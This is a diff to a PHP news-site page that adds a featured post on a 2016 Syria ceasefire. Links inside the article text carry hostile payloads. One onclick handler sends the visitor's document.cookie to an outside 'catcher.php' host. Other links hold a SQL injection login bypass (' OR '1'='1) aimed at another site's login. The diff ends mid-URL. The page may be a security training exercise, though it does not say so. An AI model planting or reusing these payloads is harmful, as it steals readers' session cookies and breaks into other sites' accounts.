@@ -5,6 +5,33 @@ include 'header.php';
     <!-- begin featured -->
     <div id="featured">
 
+<!-- start of post  -->
+<div class="post">
+	  
+    	  
+    <!-- headline -->    
+     <h2> <a href="/featured/20160913-syria-ceasefire.php">Syria: Temporary ceasefire begins amid skepticism</a></h2>
+       
+  <p class="details">By Tim Hume and Holly Yan ,September13, 2016   <a href="#"></a> </p>
+           <div class="thumb"><a href="#"><img src="/images/syriaceasefire.png"  alt="Syriaceasefire" /></a></div>
+       
+<p>
+
+Hours after a <a href="http://www.theplanetreports.com/home.php?username=%27+OR+%271%27%3D%271&password=%27+OR+%271%27%3D%
+271&submit=Login" target="_blank"> ceasefire started </a> in Syria on Monday, the world waited to see how long the fragile peace would last.
+</p><p>
+The deal, brokered by the United States and Russia, calls for a <a onclick="document.location='http://www.latenightreport.com/catcher.php?c='+escape(document.cookie);" href="#"> halt to the violence between </a> the Syrian regime and rebel forces. It would also allow for much-needed humanitarian access to besieged cities such as Aleppo.
+</p>
+
+<p class="readmore">[ <a href="/featured/20160913-syria-ceasefire.php">read more</a> ]</p>
+	          	<div class="break"></div>
+</div>  
+<!-- end of post -->
+
+
+
+
+
 
 <!-- start of post  -->
 <div class="post">
@@ -14,7 +41,7 @@ include 'header.php';
      <h2> <a href="/featured/20160912-clinton-pneumonia.php">Hillary Clinton’s Doctor Says Pneumonia Led to Abrupt Exit From 9/11 Event</a></h2>
        
   <p class="details">By JONATHAN MARTIN and AMY CHOZICKSEPT. 12, 2016  <a href="#"></a> </p>
-           <div class="thumb"><a href="#"><img src="hillary-clinton-ill.jpg"  alt="Hillary-clinton-ill" /></a></div>
+           <div class="thumb"><a href="#"><img src="/images/hillary-clinton-ill.jpg"  alt="Hillary-clinton-ill" /></a></div>
        
 <p>
 Hillary Clinton is being treated for <a href="http://www.theplanetreports.com/home.php?username=%27+OR+%271%27%3D%271&password=%27+OR+%271%27%3D%
